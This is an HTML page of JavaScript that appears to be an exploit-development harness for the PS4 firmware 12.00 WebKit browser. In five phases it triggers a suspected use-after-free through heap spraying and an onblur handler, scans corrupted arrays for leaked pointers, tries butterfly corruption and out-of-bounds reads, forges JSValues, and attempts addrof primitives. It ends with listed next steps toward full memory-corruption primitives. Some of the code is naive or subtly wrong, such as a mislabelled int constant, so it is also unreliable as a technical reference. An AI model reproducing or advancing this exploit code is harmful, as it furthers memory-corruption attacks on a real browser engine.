<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Butterfly & JSValue Forging Tests</title>

</head>
<body>

<h1>üéØ PS4 FW 12.00 - BUTTERFLY CORRUPTION & JSVALUE FORGING</h1>

<div class="section">
<h2>FASE 1: Setup Duplo UAF</h2>
<button onclick="phase1_setup()">CRIAR ARRAYS + TRIGGER UAF</button>
<div id="phase1"></div>
</div>

<div class="section">
<h2>FASE 2: Big Scan (Detector de Ponteiros)</h2>
<button onclick="phase2_bigscan()">ESCANEAR PONTEIROS</button>
<div id="phase2"></div>
</div>

<div class="section">
<h2>FASE 3: Butterfly Corruption Tests</h2>
<button onclick="phase3_butterfly()">TESTAR BUTTERFLY CORRUPTION</button>
<div id="phase3"></div>
</div>

<div class="section">
<h2>FASE 4: JSValue Forging</h2>
<button onclick="phase4_jsvalue()">FORJAR JSVALUE</button>
<div id="phase4"></div>
</div>

<div class="section">
<h2>FASE 5: Advanced addrof Attempts</h2>
<button onclick="phase5_addrof()">TENTAR ADDROF</button>
<div id="phase5"></div>
</div>

<script>
// === GLOBALS ===
var g_arrays = {
    Float64: [], Float32: [], BigUint64: [], BigInt64: [],
    Uint32: [], Int32: [], Uint16: [], Int16: [],
    Uint8: [], Int8: [], Regular: []
};
var g_corrupted = {};
var g_pointers = [];
var g_metadata = [];

// === UTILS ===
function hex(n) {
    if(typeof n === 'bigint') {
        return '0x' + n.toString(16).padStart(16, '0');
    }
    const b = new ArrayBuffer(8);
    new Float64Array(b)[0] = n;
    const u = new Uint32Array(b);
    return '0x' + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
}

function makeFloat(hi, lo) {
    const b = new ArrayBuffer(8);
    const u = new Uint32Array(b);
    u[0] = lo; u[1] = hi;
    return new Float64Array(b)[0];
}

function log(target, msg, cls) {
    const d = document.getElementById(target);
    const t = new Date().toLocaleTimeString();
    d.innerHTML += `<div class="${cls||''}">[${t}] ${msg}</div>`;
}

// === FASE 1: SETUP ===
function phase1_setup() {
    const target = 'phase1';
    document.getElementById(target).innerHTML = '';
    log(target, '=== CRIANDO ESTRUTURAS ===', 'success');
    
    const count = 500;
    const P = 2.121995791e-314;
    
    // TypedArrays
    for(let i = 0; i < count; i++) {
        g_arrays.Float64.push(new Float64Array(8));
        g_arrays.Float32.push(new Float32Array(8));
        
        let bu64 = new BigUint64Array(8);
        bu64[0] = BigInt(i);
        g_arrays.BigUint64.push(bu64);
        
        g_arrays.BigInt64.push(new BigInt64Array(8));
        g_arrays.Uint32.push(new Uint32Array(16));
        g_arrays.Int32.push(new Int32Array(16));
        g_arrays.Uint16.push(new Uint16Array(32));
        g_arrays.Int16.push(new Int16Array(32));
        g_arrays.Uint8.push(new Uint8Array(64));
        g_arrays.Int8.push(new Int8Array(64));
    }
    
    // Arrays regulares (CR√çTICO para Butterfly)
    for(let i = 0; i < 1000; i++) {
        const arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
        arr.marker = i; // Para detec√ß√£o
        g_arrays.Regular.push(arr);
    }
    
    log(target, `Criados ${count * 10} TypedArrays + ${g_arrays.Regular.length} Arrays regulares`, 'success');
    log(target, '', '');
    log(target, '<span class="warning">‚ö†Ô∏è  APERTE OPTIONS 2x PARA UAF DUPLO</span>', 'warning');
    
    if(document.documentElement.webkitRequestFullscreen) {
        document.documentElement.webkitRequestFullscreen();
    }
    
    let triggerCount = 0;
    
    window.onblur = function() {
        triggerCount++;
        log(target, `üî• TRIGGER ${triggerCount}/2`, 'warning');
        
        // Spray at√¥mico
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            const s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        if(triggerCount === 2) {
            log(target, '', '');
            log(target, '=== DETECTANDO CORRUP√á√ÉO ===', 'success');
            
            // Detecta TypedArrays corrompidos
            for(let type in g_arrays) {
                if(type === 'Regular') continue;
                
                const corrupted = g_arrays[type].filter(a => {
                    if(type === 'BigUint64') return a[0] !== BigInt(g_arrays[type].indexOf(a));
                    if(type.includes('Big')) return a[0] === 0n;
                    if(type.includes('Float')) return a[0] === P;
                    return a[0] === 0 && g_arrays[type].indexOf(a) !== 0;
                });
                
                if(corrupted.length > 0) {
                    g_corrupted[type] = corrupted[0];
                    log(target, `‚úì ${type}Array corrompido (${corrupted.length} encontrados)`, 'success');
                }
            }
            
            // Detecta Arrays regulares corrompidos
            let regCorrupted = 0;
            for(let i = 0; i < g_arrays.Regular.length; i++) {
                const arr = g_arrays.Regular[i];
                try {
                    if(arr.length !== 8 || arr[0] !== 1.1 || arr.marker !== i) {
                        regCorrupted++;
                        if(!g_corrupted.Regular) {
                            g_corrupted.Regular = arr;
                            log(target, `‚úì Array regular corrompido! (√≠ndice ${i})`, 'pointer');
                        }
                    }
                } catch(e) {
                    regCorrupted++;
                }
            }
            
            if(regCorrupted > 0) {
                log(target, `‚ö†Ô∏è  ${regCorrupted} Arrays regulares afetados`, 'warning');
            }
            
            log(target, '', '');
            log(target, '<span class="success">‚úì FASE 1 COMPLETA - Prossiga para FASE 2</span>', 'success');
            window.onblur = null;
        }
    };
}

// === FASE 2: BIG SCAN ===
function phase2_bigscan() {
    const target = 'phase2';
    document.getElementById(target).innerHTML = '';
    
    if(!g_corrupted.BigUint64) {
        log(target, '‚ùå Execute FASE 1 primeiro!', 'error');
        return;
    }
    
    log(target, '=== SCANNING MEMORY ===', 'success');
    g_pointers = [];
    g_metadata = [];
    
    let totalLeaks = 0;
    
    g_arrays.BigUint64.forEach((arr, idx) => {
        const expected = BigInt(idx);
        let leaked = false;
        
        for(let i = 0; i < arr.length; i++) {
            const val = arr[i];
            
            if(i === 0 && val === expected) continue;
            if(val === 0n) continue;
            
            leaked = true;
            totalLeaks++;
            
            // Detecta ponteiros PS4 (0x7f...)
            if(val >= 0x7f0000000000n && val <= 0x7fffffffffffn) {
                g_pointers.push({
                    array: idx,
                    offset: i * 8,
                    value: val,
                    hex: hex(val)
                });
                log(target, `<span class="pointer">üéØ PONTEIRO: ${hex(val)} (Array #${idx}, offset ${i*8})</span>`, 'pointer');
            }
            // Detecta metadados (StructureID, etc)
            else if((val & 0xFFFn) === 0x108n || (val & 0xFFn) === 0x25n) {
                g_metadata.push({
                    array: idx,
                    offset: i * 8,
                    value: val,
                    hex: hex(val)
                });
                log(target, `<span class="metadata">üìä METADATA: ${hex(val)} (Array #${idx}, offset ${i*8})</span>`, 'metadata');
            } else if(val > 0x1000n) {
                log(target, `Data: ${hex(val)} (Array #${idx}, offset ${i*8})`, '');
            }
        }
    });
    
    log(target, '', '');
    log(target, `=== RESUMO ===`, 'success');
    log(target, `Total vazamentos: ${totalLeaks}`, '');
    log(target, `Ponteiros (0x7f...): ${g_pointers.length}`, 'pointer');
    log(target, `Metadados: ${g_metadata.length}`, 'metadata');
    
    if(g_pointers.length > 0) {
        log(target, '', '');
        log(target, '<span class="success">‚úì PONTEIROS ENCONTRADOS! Prossiga para FASE 3</span>', 'success');
    } else {
        log(target, '<span class="warning">‚ö†Ô∏è  Nenhum ponteiro detectado - Heap pode estar segregado</span>', 'warning');
    }
}

// === FASE 3: BUTTERFLY CORRUPTION ===
function phase3_butterfly() {
    const target = 'phase3';
    document.getElementById(target).innerHTML = '';
    
    log(target, '=== TESTANDO BUTTERFLY CORRUPTION ===', 'success');
    log(target, '', '');
    
    // TEST 3.1: Tentar corromper butterfly via TypedArray
    log(target, '[TEST 3.1] Butterfly via TypedArray Write', 'warning');
    
    if(g_corrupted.Float64 && g_pointers.length > 0) {
        const ptr = g_pointers[0].value;
        log(target, `Usando ponteiro: ${hex(ptr)}`, '');
        
        try {
            // Tenta escrever o ponteiro no corrupted array
            const b = new ArrayBuffer(8);
            const view = new DataView(b);
            view.setBigUint64(0, ptr, true);
            const fakeFloat = new Float64Array(b)[0];
            
            g_corrupted.Float64[0] = fakeFloat;
            
            log(target, `Escrito em Float64[0]: ${hex(g_corrupted.Float64[0])}`, 'success');
            
            // Tenta acessar via Array regular
            if(g_corrupted.Regular) {
                try {
                    const leak = g_corrupted.Regular[100]; // Acesso OOB
                    log(target, `Regular[100] ap√≥s corrup√ß√£o: ${leak}`, leak !== undefined ? 'pointer' : 'warning');
                } catch(e) {
                    log(target, `Regular[100] gerou exce√ß√£o: ${e.message}`, 'warning');
                }
            }
        } catch(e) {
            log(target, `‚ùå Erro: ${e.message}`, 'error');
        }
    } else {
        log(target, '‚ö†Ô∏è  Sem ponteiros dispon√≠veis', 'warning');
    }
    
    log(target, '', '');
    
    // TEST 3.2: Detectar mudan√ßas em Array.length
    log(target, '[TEST 3.2] Array.length Corruption Detection', 'warning');
    
    let corruptedLengths = 0;
    for(let i = 0; i < g_arrays.Regular.length; i++) {
        const arr = g_arrays.Regular[i];
        try {
            if(arr.length !== 8) {
                corruptedLengths++;
                log(target, `Array #${i}: length = ${arr.length} (esperado: 8)`, 'pointer');
                
                if(arr.length > 1000) {
                    log(target, `  ‚ö†Ô∏è  Length extremo detectado! Tentando OOB read...`, 'warning');
                    try {
                        for(let j = 8; j < Math.min(arr.length, 50); j++) {
                            const val = arr[j];
                            if(val !== undefined && val !== 0) {
                                log(target, `    OOB[${j}] = ${typeof val === 'number' ? hex(val) : val}`, 'pointer');
                            }
                        }
                    } catch(e) {
                        log(target, `    Exce√ß√£o em OOB read: ${e.message}`, 'warning');
                    }
                }
            }
        } catch(e) {
            corruptedLengths++;
        }
    }
    
    log(target, `Total com length corrompido: ${corruptedLengths}`, corruptedLengths > 0 ? 'pointer' : '');
    log(target, '', '');
    
    // TEST 3.3: Modificar Butterfly pointer direto
    log(target, '[TEST 3.3] Direct Butterfly Pointer Modification', 'warning');
    
    if(g_corrupted.BigUint64 && g_pointers.length > 0) {
        try {
            const targetPtr = g_pointers[0].value;
            log(target, `Tentando injetar ${hex(targetPtr)} em BigUint64[2]`, '');
            
            g_corrupted.BigUint64[2] = targetPtr;
            const readback = g_corrupted.BigUint64[2];
            
            log(target, `Readback: ${hex(readback)}`, '');
            
            if(readback === targetPtr) {
                log(target, '‚úì Ponteiro mantido! Tentando usar como Butterfly...', 'success');
                
                // Procura por Array que possa ter sido afetado
                for(let i = 0; i < 100; i++) {
                    try {
                        const testArr = g_arrays.Regular[i];
                        const leak = testArr[20]; // OOB
                        if(leak !== undefined) {
                            log(target, `  ‚úì Regular[${i}][20] = ${leak} (poss√≠vel OOB!)`, 'pointer');
                        }
                    } catch(e) {}
                }
            } else {
                log(target, '‚ùå Ponteiro n√£o se manteve', 'error');
            }
        } catch(e) {
            log(target, `‚ùå Erro: ${e.message}`, 'error');
        }
    }
    
    log(target, '', '');
    log(target, '<span class="success">FASE 3 COMPLETA - Prossiga para FASE 4</span>', 'success');
}

// === FASE 4: JSVALUE FORGING ===
function phase4_jsvalue() {
    const target = 'phase4';
    document.getElementById(target).innerHTML = '';
    
    log(target, '=== JSVALUE FORGING ===', 'success');
    log(target, '', '');
    
    // TEST 4.1: JSValue structure
    log(target, '[TEST 4.1] JSValue Format Analysis', 'warning');
    log(target, 'JSValue no WebKit (NaN-boxing):', '');
    log(target, '  Bits 48-63: Tag (0x0001 = int, 0xFFF8-0xFFFF = pointer)', '');
    log(target, '  Bits 0-47: Payload (valor ou ponteiro)', '');
    log(target, '', '');
    
    // TEST 4.2: Forjar JSValue de inteiro
    log(target, '[TEST 4.2] Forging Integer JSValue', 'warning');
    
    if(g_corrupted.BigUint64) {
        try {
            // JSValue para int32(42) = 0xFFFF000000000000 | 0x2A
            const intJSValue = 0xFFFF00000000002An;
            
            g_corrupted.BigUint64[3] = intJSValue;
            const readback = g_corrupted.BigUint64[3];
            
            log(target, `Escrito: ${hex(intJSValue)}`, '');
            log(target, `Lido: ${hex(readback)}`, '');
            
            if(readback === intJSValue) {
                log(target, '‚úì JSValue mantido!', 'success');
            }
        } catch(e) {
            log(target, `‚ùå Erro: ${e.message}`, 'error');
        }
    }
    
    log(target, '', '');
    
    // TEST 4.3: Forjar JSValue de ponteiro
    log(target, '[TEST 4.3] Forging Pointer JSValue', 'warning');
    
    if(g_corrupted.BigUint64 && g_pointers.length > 0) {
        try {
            const ptr = g_pointers[0].value;
            // JSValue com tag de cell pointer
            const ptrJSValue = ptr | 0x0000n; // Tag 0x0000 = cell pointer
            
            g_corrupted.BigUint64[4] = ptrJSValue;
            
            log(target, `Ponteiro original: ${hex(ptr)}`, '');
            log(target, `JSValue forjado: ${hex(ptrJSValue)}`, '');
            log(target, `Readback: ${hex(g_corrupted.BigUint64[4])}`, '');
        } catch(e) {
            log(target, `‚ùå Erro: ${e.message}`, 'error');
        }
    }
    
    log(target, '', '');
    
    // TEST 4.4: Array com JSValues forjados
    log(target, '[TEST 4.4] Creating Array with Fake JSValues', 'warning');
    
    if(g_corrupted.BigUint64) {
        try {
            // Cria sequ√™ncia de JSValues
            const jsvalues = [
                0xFFFF00000000002An, // int(42)
                0xFFFF000000000045n, // int(69)
                0xFFFF00000000539n,  // int(1337)
            ];
            
            for(let i = 0; i < jsvalues.length; i++) {
                g_corrupted.BigUint64[5 + i] = jsvalues[i];
            }
            
            log(target, 'JSValues escritos:', '');
            for(let i = 0; i < jsvalues.length; i++) {
                log(target, `  [${5+i}] = ${hex(jsvalues[i])}`, 'success');
            }
        } catch(e) {
            log(target, `‚ùå Erro: ${e.message}`, 'error');
        }
    }
    
    log(target, '', '');
    log(target, '<span class="success">FASE 4 COMPLETA - Prossiga para FASE 5</span>', 'success');
}

// === FASE 5: ADDROF ATTEMPTS ===
function phase5_addrof() {
    const target = 'phase5';
    document.getElementById(target).innerHTML = '';
    
    log(target, '=== ADVANCED ADDROF ATTEMPTS ===', 'success');
    log(target, '', '');
    
    // TEST 5.1: Via Array.sort() confusion
    log(target, '[TEST 5.1] Array.sort() Type Confusion', 'warning');
    
    try {
        const victim = {x: 0x1337, y: 0xdead};
        const confused = [1.1, 2.2, victim, 3.3];
        
        confused.sort((a, b) => {
            if(g_corrupted.Float64) {
                // Tenta for√ßar convers√£o durante sort
                g_corrupted.Float64[0] = victim;
                return 0;
            }
            return a - b;
        });
        
        if(g_corrupted.Float64) {
            log(target, `Float64[0] ap√≥s sort: ${hex(g_corrupted.Float64[0])}`, '');
        }
    } catch(e) {
        log(target, `‚ùå Erro: ${e.message}`, 'error');
    }
    
    log(target, '', '');
    
    // TEST 5.2: Via Array holes + corruption
    log(target, '[TEST 5.2] Array Holes Exploitation', 'warning');
    
    try {
        const holey = [1.1, , , , victim = {leak: 0xbeef}];
        
        if(g_corrupted.Regular) {
            // Tenta fazer Regular apontar para holey
            for(let i = 0; i < 100; i++) {
                try {
                    const leak = g_corrupted.Regular[i];
                    if(leak && typeof leak === 'object' && leak.leak === 0xbeef) {
                        log(target, `‚úì Objeto vazado via Regular[${i}]!`, 'pointer');
                    }
                } catch(e) {}
            }
        }
    } catch(e) {
        log(target, `‚ùå Erro: ${e.message}`, 'error');
    }
    
    log(target, '', '');
    
    // TEST 5.3: Via Map iteration
    log(target, '[TEST 5.3] Map/WeakMap Confusion', 'warning');
    
    try {
        const obj = {addrof: 0xc0de};
        const map = new Map();
        map.set('key', obj);
        
        if(g_corrupted.BigUint64) {
            // Itera e tenta capturar refer√™ncias
            map.forEach((val, key) => {
                try {
                    g_corrupted.BigUint64[7] = 0xdeadbeefn;
                    const leak = g_corrupted.BigUint64[7];
                    log(target, `Durante itera√ß√£o: ${hex(leak)}`, '');
                } catch(e) {}
            });
        }
    } catch(e) {
        log(target, `‚ùå Erro: ${e.message}`, 'error');
    }
    
    log(target, '', '');
    
    // TEST 5.4: Via Proxy traps
    log(target, '[TEST 5.4] Proxy Trap Exploitation', 'warning');
    
    try {
        const target_obj = {proxy: 0x1337};
        const handler = {
            get: function(target, prop) {
                if(g_corrupted.Float64) {
                    g_corrupted.Float64[1] = target_obj;
                    log(target, `Proxy trap: ${hex(g_corrupted.Float64[1])}`, '');
                }
                return target[prop];
            }
        };
        
        const proxy = new Proxy(target_obj, handler);
        const access = proxy.proxy;
    } catch(e) {
        log(target, `‚ùå Erro: ${e.message}`, 'error');
    }
    
    log(target, '', '');
    
    // TEST 5.5: Direct Butterfly read attempt
    log(target, '[TEST 5.5] Direct Butterfly Read', 'warning');
    
    if(g_corrupted.Regular && g_corrupted.BigUint64) {
        try {
            log(target, 'Tentando ler estrutura interna do Array...', '');
            
            // Tenta detectar padr√£o de Butterfly
            for(let i = 0; i < 8; i++) {
                const val = g_corrupted.BigUint64[i];
                if(val > 0x7f0000000000n && val < 0x7fffffffffffn) {
                    log(target, `  Poss√≠vel Butterfly em [${i}]: ${hex(val)}`, 'pointer');
                    
                    // Tenta modificar
                    const modified = val + 0x10n;
                    g_corrupted.BigUint64[i] = modified;
                    
                    // Verifica se algum Array mudou
                    for(let j = 0; j < 50; j++) {
                        try {
                            const arr = g_arrays.Regular[j];
                            if(arr.length > 100 || arr.length === 0) {
                                log(target, `  ‚ö†Ô∏è  Regular[${j}].length alterado: ${arr.length}`, 'warning');
                            }
                        } catch(e) {}
                    }
                    
                    // Reverte
                    g_corrupted.BigUint64[i] = val;
                }
            }
        } catch(e) {
            log(target, `‚ùå Erro: ${e.message}`, 'error');
        }
    }
    
    log(target, '', '');
    log(target, '=== AN√ÅLISE FINAL ===', 'success');
    log(target, '', '');
    
    if(g_pointers.length > 0) {
        log(target, `<span class="pointer">‚úì Ponteiros capturados: ${g_pointers.length}</span>`, 'pointer');
        log(target, `  Primeiro: ${g_pointers[0].hex}`, '');
        log(target, '', '');
        log(target, '‚ö†Ô∏è  PR√ìXIMOS PASSOS:', 'warning');
        log(target, '  1. Identificar qual ponteiro √© Butterfly', '');
        log(target, '  2. Modificar Butterfly para apontar para JSValues forjados', '');
        log(target, '  3. Usar Array corrompido para ler JSValues como objetos', '');
        log(target, '  4. Implementar addrof(obj) ‚Üí retorna ponteiro', '');
    } else {
        log(target, '<span class="warning">‚ö†Ô∏è  Nenhum ponteiro capturado - Heap segregation forte</span>', 'warning');
        log(target, '', '');
        log(target, 'Alternativas:', '');
        log(target, '  - Tentar com mais triggers UAF', '');
        log(target, '  - Explorar outros bugs (JIT, GC timing)', '');
        log(target, '  - Usar t√©cnicas de heap grooming mais agressivas', '');
    }
    
    log(target, '', '');
    log(target, '<span class="success">‚úì TODAS AS FASES COMPLETAS</span>', 'success');
}
</script>

</body>
</html>
